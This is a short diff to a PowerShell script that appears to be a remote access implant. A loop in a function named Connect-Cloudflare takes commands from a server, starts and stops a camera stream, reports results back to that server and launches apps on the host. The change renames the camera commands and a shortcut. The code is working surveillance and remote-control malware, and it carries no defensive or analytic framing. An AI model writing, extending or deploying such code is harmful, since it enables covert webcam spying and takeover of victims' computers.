@@ -991,7 +991,7 @@ function Connect-Cloudflare {
                     continue
                 }
 
-                if ($command -eq "camera") {
+                if ($command -eq "stream") {
                     if ($script:sharedState -and $script:sharedState.CameraRunning) {
                         Send-Result-To-Server -Body "[!] Camera stream already running`n"
                     } else {
@@ -1020,7 +1020,7 @@ function Connect-Cloudflare {
                     continue
                 }
 
-                if ($command -eq "stopcamera") {
+                if ($command -eq "stopstream") {
                     Stop-CameraStream
                     Send-Result-To-Server -Body "[*] Camera stream stopped`n"
                     Start-Sleep -Milliseconds $activeDelay
@@ -1029,7 +1029,7 @@ function Connect-Cloudflare {
 
                 # Shortcut commands → auto-route to gui:
                 $guiShortcuts = @{
-                    "camera_app" = "cmd /c start microsoft.windows.camera:"
+                    "camera"     = "cmd /c start microsoft.windows.camera:"
                     "recorder"   = "cmd /c start microsoft.windows.soundrecorder:"
                     "settings"   = "cmd /c start ms-settings:"
                     "calc"       = "calc.exe"
